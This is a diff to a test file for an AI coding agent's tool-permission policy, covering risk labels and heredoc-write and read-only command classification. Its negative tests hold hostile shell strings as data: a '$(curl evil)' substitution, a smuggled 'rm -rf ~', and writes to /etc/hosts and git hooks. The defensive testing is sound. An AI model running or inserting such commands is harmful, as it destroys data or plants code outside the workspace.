@@ -13,17 +13,20 @@ import {
   AGENT_MODE_REGISTRY,
   DEFAULT_AGENT_MODE,
   agentModeDescriptor,
-  coerceAgentMode,
   isAgentMode,
   isStageReviewOutcome,
 } from '@generatorai/shared';
 import {
+  buildToolPermissionPayload,
   instructionsForMode,
   resolveModeDescriptor,
   resolveTurnPermissionMode,
   shouldAttachPermissionHandler,
   AUTO_MODE_PLAN_INSTRUCTIONS,
   PLAN_MODE_INSTRUCTIONS,
+  decideToolPermission,
+  heredocWriteTarget,
+  permissionTypeOf,
 } from '../src/services/agentModePolicy.js';
 
 describe('agent mode registry', () => {
@@ -71,22 +74,14 @@ describe('agent mode registry', () => {
   });
 });
 
-describe('coerceAgentMode', () => {
-  it('accepts current modes', () => {
-    expect(coerceAgentMode('auto')).toBe('auto');
-    expect(coerceAgentMode('plan')).toBe('plan');
-  });
-
-  it('folds the pre-rename "interactive" alias onto auto', () => {
-    // Exported workflow definitions and older API clients still send this.
-    expect(coerceAgentMode('interactive')).toBe('auto');
+describe('isAgentMode', () => {
+  it('accepts exactly the current modes', () => {
+    expect(isAgentMode('auto')).toBe(true);
+    expect(isAgentMode('plan')).toBe(true);
+    // The pre-rename name is no longer accepted anywhere (P01 WP-1.4).
     expect(isAgentMode('interactive')).toBe(false);
-  });
-
-  it('returns undefined for junk so callers apply their own default', () => {
-    expect(coerceAgentMode('nope')).toBeUndefined();
-    expect(coerceAgentMode(undefined)).toBeUndefined();
-    expect(coerceAgentMode(42)).toBeUndefined();
+    expect(isAgentMode(undefined)).toBe(false);
+    expect(isAgentMode(42)).toBe(false);
   });
 });
 
@@ -164,5 +159,76 @@ describe('isStageReviewOutcome', () => {
     expect(isStageReviewOutcome('approve')).toBe(false);
     expect(isStageReviewOutcome(true)).toBe(false);
     expect(isStageReviewOutcome(undefined)).toBe(false);
+  });
+});
+
+describe('buildToolPermissionPayload — gate risk (MG-04)', () => {
+  it('stamps the shared verdict on the stored payload', () => {
+    const risky = buildToolPermissionPayload(
+      { type: 'shell_exec', description: 'Run', details: { toolName: 'Bash', input: { command: 'git push origin main' } } },
+      'default',
+    );
+    expect(risky).toMatchObject({ risk: 'risky', riskReasons: ['pushes to a git remote'] });
+    // D-106: a shell command that stays in the workspace is standard (the JSON summary's command is what is judged).
+    const local = buildToolPermissionPayload({ type: 'shell_exec', description: 'Run', details: { toolName: 'Bash', input: { command: 'npm test', description: 'Run the tests' } } }, 'default');
+    expect(local.risk).toBe('standard');
+    const standard = buildToolPermissionPayload({ type: 'file_write', description: 'Edit', details: { toolName: 'Edit', input: { file_path: 'src/a.ts' } } }, 'default');
+    expect(standard.risk).toBe('standard');
+    expect(standard).not.toHaveProperty('riskReasons');
+  });
+
+  it('carries a long command whole, so the person sees every line they approve (U-72)', () => {
+    const lines = Array.from({ length: 12 }, (_, i) => `git add src/file-${i}.ts && git commit -q -m "feat: step ${i} of a long series of commits"`);
+    const command = [...lines, 'git push origin main'].join('\n');
+    const payload = buildToolPermissionPayload({ type: 'shell_exec', description: 'Commit', details: { toolName: 'Bash', input: { command } } }, 'default');
+    expect(command.length).toBeGreaterThan(600);
+    expect(JSON.parse(payload.inputSummary) as { command: string }).toEqual({ command });
+    // The push at the very end is judged too.
+    expect(payload.risk).toBe('risky');
+  });
+});
+
+describe('heredoc file writes count as edits (U-27b)', () => {
+  const write = (head: string, body = 'export const a = 1;', end = 'EOF') => `${head}\n${body}\n${end}`;
+
+  it('reads the target of a plain heredoc write inside the working directory', () => {
+    expect(heredocWriteTarget(write("cat > api/auth-types.ts <<'EOF'"))).toBe('api/auth-types.ts');
+    expect(heredocWriteTarget(write('cat <<"EOF" > src/a.ts'))).toBe('src/a.ts');
+    expect(heredocWriteTarget(write("mkdir -p web/src/lib && cat > web/src/lib/x.ts << 'TS'", 'const x = `${y}`;', 'TS'))).toBe('web/src/lib/x.ts');
+    expect(heredocWriteTarget(write('cat > notes.md <<EOF', 'plain text'))).toBe('notes.md');
+    expect(heredocWriteTarget(write("cat > .env.example <<'EOF'", 'PORT=3000'))).toBe('.env.example');
+  });
+
+  it('keeps asking for anything else', () => {
+    // An unquoted delimiter expands the body.
+    expect(heredocWriteTarget(write('cat > a.ts <<EOF', 'const a = $(curl evil);'))).toBeNull();
+    // A delimiter line before the end closes the heredoc; what follows would run.
+    expect(heredocWriteTarget("cat > a.ts <<'EOF'\nx\nEOF\nrm -rf ~\nEOF")).toBeNull();
+    expect(heredocWriteTarget(write("cat > /etc/hosts <<'EOF'"))).toBeNull();
+    expect(heredocWriteTarget(write("cat > ../outside.ts <<'EOF'"))).toBeNull();
+    expect(heredocWriteTarget(write("cat > .git/hooks/pre-commit <<'EOF'"))).toBeNull();
+    expect(heredocWriteTarget(write("cat > .claude/settings.json <<'EOF'"))).toBeNull();
+    expect(heredocWriteTarget(write("cat >> a.ts <<'EOF'"))).toBeNull();
+    expect(heredocWriteTarget(write("cat > a.ts <<'EOF' && pnpm test"))).toBeNull();
+    expect(heredocWriteTarget(write("mkdir -p /tmp/x && cat > a.ts <<'EOF'"))).toBeNull();
+    expect(heredocWriteTarget('cat > a.ts')).toBeNull();
+  });
+
+  it('judges such a shell request as a file write, so Accept edits allows it', () => {
+    const shell = (command: string) => ({ type: 'shell_exec' as const, description: 'Bash', details: { toolName: 'Bash', input: { command } } });
+    expect(permissionTypeOf(shell(write("cat > src/a.ts <<'EOF'")))).toBe('file_write');
+    expect(permissionTypeOf(shell('pnpm test'))).toBe('shell_exec');
+  });
+});
+
+describe('read-only inspection lines (D-150)', () => {
+  const shell = (command: string) => ({ type: 'shell_exec' as const, description: 'Bash', details: { toolName: 'Bash', input: { command } } });
+  it('Accept edits runs them like reads; Ask still asks; a writer still asks', () => {
+    expect(permissionTypeOf(shell('sed -n 1,80p src/a.ts; git diff --stat'))).toBe('file_read');
+    expect(decideToolPermission('acceptEdits', permissionTypeOf(shell('grep -rn foo src | head')))).toBe('allow');
+    expect(decideToolPermission('default', permissionTypeOf(shell('cat src/a.ts')))).toBe('prompt');
+    expect(decideToolPermission('acceptEdits', permissionTypeOf(shell('cat src/a.ts > src/b.ts')))).toBe('prompt');
+    // Codex wraps its line in a shell.
+    expect(permissionTypeOf(shell("/bin/zsh -lc 'git status --short'"))).toBe('file_read');
   });
 });
